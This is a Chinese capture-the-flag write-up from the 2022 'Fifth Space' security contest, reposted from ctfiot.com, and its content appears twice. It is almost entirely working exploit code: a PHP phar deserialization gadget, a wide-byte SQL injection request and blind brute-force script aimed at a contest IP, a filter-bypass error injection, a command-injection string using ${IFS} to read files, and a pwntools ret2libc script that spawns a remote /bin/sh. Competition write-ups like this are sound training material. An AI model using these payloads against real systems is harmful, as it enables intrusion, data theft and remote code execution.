# 2022“第五空间”网络安全大赛-WriteUp

> 原文: https://www.ctfiot.com/58322.html
> ID: 58322

<?php
class upload{
    public $filename;
    public $ext;
    public $size;
    public $Valid_ext;
    public function __construct(){
        $this->filename = '/flag';
    }
    public function start(){
        return $this->check();
    }
    private function check(){
        if(file_exists($this->filename)){
            return "Image already exsists";
        }elseif(!in_array($this->ext, $this->Valid_ext)){
            return "Only Image Can Be Uploaded";
        }else{
            return $this->move();
        }
    }
    private function move(){
        move_uploaded_file($_FILES["file"]["tmp_name"], "upload/".$this->filename);
        return "Upload succsess!";
    }
    public function __wakeup(){
        echo file_get_contents($this->filename);
    }
}

$A = new upload();
$phar = new Phar("phar.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub('GIF89a'." __HALT_COMPILER(); "); //设置stub
$phar->setMetadata($A); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();

POST /login.php HTTP/1.1
Host: 39.105.13.61:
10808
Content-Length: 72
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://39.105.13.61:
10808
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://39.105.13.61:
10808/login.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

username=admin%df'^(SUBSTRING(select(user()),1,1)<>0x61)#&password=admin

import requests

url = 'http://39.105.13.61:
10808/login.php'
proxies={
'http':'127.0.0.1:
8080',
'https':'127.0.0.1:
8080'
}

res=''
headers = {
    "Content-Type":"application/x-www-form-urlencoded"
}
for j in range(1, 30):
    for i in range(20, 129):
        payload = 'admin%df'^(ASCII(SUBSTRING(select(user()),{0},1))>{1})#'.format(j,i)
        data='username='+payload+'&password=admin'
        re = requests.post(url,headers=headers,data=data,proxies=proxies)
        if "密码不正确" in re.text:
            res += chr(i)
            print(res)
            break
报错注入

admin%df' anuniond (exuniontracuniontvalunionue(1,conunioncat(0x7e,(selunionect database()),0x7e)))
#

解题思路

首先爆破密码，弱口令 admin admin123

登录成功后用命令注入来rce：

127.0.0.1
cd${IFS}ky*
ls

tac${IFS}fl*

以上命令url编码后发送就可以读flag：

127.0.0.1%0acd${IFS}ky*%0als%0a%0atac${IFS}fl*

# coding=utf-8
from pwn import *
#Sloved By ReStr0
#
#p = process("./pwn")
p=remote("101.200.32.152","39876")
elf = ELF('./pwn')
libc = ELF('./libc-2.23.so')
context.log_level = 'debug'  # 设置 Log 等级
# 0x0000000000400753 : pop rdi ; ret
pop_rdi_ret = 0x400753
puts_got_addr = elf.got['puts']#得到puts的got的地址，这个地址里的数据即函数的真实地址，即我们要泄露的对象
puts_plt_addr = elf.plt['puts']#puts的plt表的地址，我们需要利用puts函数泄露
main_plt_addr = 0x4006CC#返回地址被覆盖为main函数的地址。使程序还可被溢出

print "puts_got_addr = ",hex(puts_got_addr)
print "puts_plt_addr = ",hex(puts_plt_addr)
print "main_plt_addr = ",hex(main_plt_addr)

p.recvuntil('Hello,do you want to play a game with me???')

payload = 'A'*104
payload += p64(pop_rdi_ret)
payload += p64(puts_got_addr)
payload += p64(puts_plt_addr)
payload += p64(main_plt_addr)

p.recv()
p.send(payload)
puts_addr = u64(p.recvuntil('x7f')[-6:].ljust(8,'x00'))
print "puts_addr = ",hex(puts_addr)
puts_offset = libc.symbols['puts']
libc_base_addr = puts_addr - puts_offset
print "libc_base_addr = ",hex(libc_base_addr)

system_addr=libc.symbols['system']
bin_addr=0x18ce57

payload = 'A'*104
payload += p64(pop_rdi_ret)
payload += p64(libc_base_addr+bin_addr)
payload += p64(libc_base_addr+system_addr)

p.send(payload)
sleep(2)
p.interactive()

# 0x45226 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL

end

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
<?php
class upload{
    public $filename;
    public $ext;
    public $size;
    public $Valid_ext;
    public function __construct(){
        $this->filename = '/flag';
    }
    public function start(){
        return $this->check();
    }
    private function check(){
        if(file_exists($this->filename)){
            return "Image already exsists";
        }elseif(!in_array($this->ext, $this->Valid_ext)){
            return "Only Image Can Be Uploaded";
        }else{
            return $this->move();
        }
    }
    private function move(){
        move_uploaded_file($_FILES["file"]["tmp_name"], "upload/".$this->filename);
        return "Upload succsess!";
    }
    public function __wakeup(){
        echo file_get_contents($this->filename);
    }
}

$A = new upload();
$phar = new Phar("phar.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub('GIF89a'." __HALT_COMPILER(); "); //设置stub
$phar->setMetadata($A); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
POST /login.php HTTP/1.1
Host: 39.105.13.61:
10808
Content-Length: 72
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://39.105.13.61:
10808
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://39.105.13.61:
10808/login.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

username=admin%df'^(SUBSTRING(select(user()),1,1)<>0x61)#&password=admin
import requests

url = 'http://39.105.13.61:
10808/login.php'
proxies={
'http':'127.0.0.1:
8080',
'https':'127.0.0.1:
8080'
}

res=''
headers = {
    "Content-Type":"application/x-www-form-urlencoded"
}
for j in range(1, 30):
    for i in range(20, 129):
        payload = 'admin%df'^(ASCII(SUBSTRING(select(user()),{0},1))>{1})#'.format(j,i)
        data='username='+payload+'&password=admin'
        re = requests.post(url,headers=headers,data=data,proxies=proxies)
        if "密码不正确" in re.text:
            res += chr(i)
            print(res)
            break
报错注入
admin%df' anuniond (exuniontracuniontvalunionue(1,conunioncat(0x7e,(selunionect database()),0x7e)))
#
127.0.0.1
cd${IFS}ky*
ls

tac${IFS}fl*

以上命令url编码后发送就可以读flag：

127.0.0.1%0acd${IFS}ky*%0als%0a%0atac${IFS}fl*
# coding=utf-8
from pwn import *
#Sloved By ReStr0
#
    #p = process("./pwn")
p=remote("101.200.32.152","39876")
elf = ELF('./pwn')
libc = ELF('./libc-2.23.so')
context.log_level = 'debug'  # 设置 Log 等级
# 0x0000000000400753 : pop rdi ; ret
pop_rdi_ret = 0x400753
puts_got_addr = elf.got['puts']#得到puts的got的地址，这个地址里的数据即函数的真实地址，即我们要泄露的对象
puts_plt_addr = elf.plt['puts']#puts的plt表的地址，我们需要利用puts函数泄露
main_plt_addr = 0x4006CC#返回地址被覆盖为main函数的地址。使程序还可被溢出

print "puts_got_addr = ",hex(puts_got_addr)
print "puts_plt_addr = ",hex(puts_plt_addr)
print "main_plt_addr = ",hex(main_plt_addr)

p.recvuntil('Hello,do you want to play a game with me???')

payload = 'A'*104
payload += p64(pop_rdi_ret)
payload += p64(puts_got_addr)
payload += p64(puts_plt_addr)
payload += p64(main_plt_addr)

p.recv()
p.send(payload)
puts_addr = u64(p.recvuntil('x7f')[-6:].ljust(8,'x00'))
print "puts_addr = ",hex(puts_addr)
puts_offset = libc.symbols['puts']
libc_base_addr = puts_addr - puts_offset
print "libc_base_addr = ",hex(libc_base_addr)

system_addr=libc.symbols['system']
bin_addr=0x18ce57

payload = 'A'*104
payload += p64(pop_rdi_ret)
payload += p64(libc_base_addr+bin_addr)
payload += p64(libc_base_addr+system_addr)

p.send(payload)
sleep(2)
p.interactive()

# 0x45226 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/4-1663811036.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/7-1663811040.jpeg)